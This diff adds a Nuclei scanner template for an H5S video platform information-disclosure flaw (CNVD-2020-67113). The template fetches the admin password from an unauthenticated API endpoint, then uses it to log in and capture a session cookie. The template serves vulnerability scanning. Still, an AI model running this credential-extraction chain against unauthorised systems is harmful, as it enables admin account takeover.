@@ -1,0 +1,61 @@
+id: h5s-getuserinfo-info-leakage
+
+info:
+  name: H5S GetUserInfo Information Leakage (CNVD-2020-67113)
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    H5S video platform is a video management platform that supports Windows Linux (CentOS ubuntu). The H5S video platform has an information disclosure vulnerability. The attacker can obtain the administrator account password and cookie information to log in to the backend.
+  tags: information-disclosure
+
+flow: |
+  http(0) && http(1)
+
+http:
+  - raw:
+      - |
+        GET /api/v1/GetUserInfo?user=admin&session= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+
+    extractors:
+      - type: regex
+        name: password
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - "\"strPasswd\": \"(.*?)\","
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"strUser\": \"admin\""
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /api/v1/Login?user=admin&password={{password}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+
+    extractors:
+      - type: regex
+        name: session_cookie
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - "\"strSession\": \"(.*?)\","
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"strSession\": \""
+      - type: status
+        status:
+          - 200
